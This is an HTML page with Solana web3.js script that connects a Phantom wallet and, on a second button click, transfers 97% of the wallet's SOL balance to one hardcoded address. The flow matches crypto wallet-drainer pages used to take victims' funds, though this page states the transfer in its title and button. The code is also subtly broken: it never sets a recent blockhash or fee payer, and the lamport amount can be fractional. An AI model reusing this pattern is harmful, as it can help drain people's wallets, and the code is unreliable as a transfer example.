<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send SOL to A647hLQ8eZe3qLHzgxGjp1qC9ydL1xVTh7uV2bigsA26</title>
  <script src="https://unpkg.com/@solana/web3.js/dist/web3.min.js"></script>
</head>
<body>
  <button id="connectButton">Connect Wallet</button>
  <button id="sendButton" style="display:none;">Send 97% SOL to A647hLQ8eZe3qLHzgxGjp1qC9ydL1xVTh7uV2bigsA26</button>

  <script>
    const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;
    
    // Phantom wallet connection
    const connectButton = document.getElementById('connectButton');
    const sendButton = document.getElementById('sendButton');

    // Connect wallet when user clicks on the connect button
    connectButton.onclick = async () => {
      if (window.solana && window.solana.isPhantom) {
        try {
          // Request wallet connection
          await window.solana.connect();
          console.log('Wallet connected:', window.solana.publicKey.toString());
          connectButton.style.display = 'none';
          sendButton.style.display = 'block';
        } catch (err) {
          console.error('Failed to connect wallet:', err);
        }
      } else {
        alert('Please install Phantom Wallet');
      }
    };

    // Send SOL when the user clicks the send button
    sendButton.onclick = async () => {
      const publicKey = window.solana.publicKey;
      const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
      const recipient = new PublicKey('A647hLQ8eZe3qLHzgxGjp1qC9ydL1xVTh7uV2bigsA26');

      try {
        // Get the wallet balance (in lamports, which is 1 SOL = 1e9 lamports)
        const balance = await connection.getBalance(publicKey);
        const amountToSendLamports = (balance * 0.97); // 97% of the balance
        console.log(`Sending ${amountToSendLamports / 1e9} SOL to ${recipient.toString()}`);

        // Create transaction to transfer SOL
        const transaction = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: recipient,
            lamports: amountToSendLamports
          })
        );

        // Sign the transaction using Phantom
        const signedTransaction = await window.solana.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signedTransaction.serialize());

        // Confirm the transaction
        await connection.confirmTransaction(signature);
        console.log('Transaction successful:', signature);
      } catch (err) {
        console.error('Error sending SOL:', err);
      }
    };
  </script>
</body>
</html>



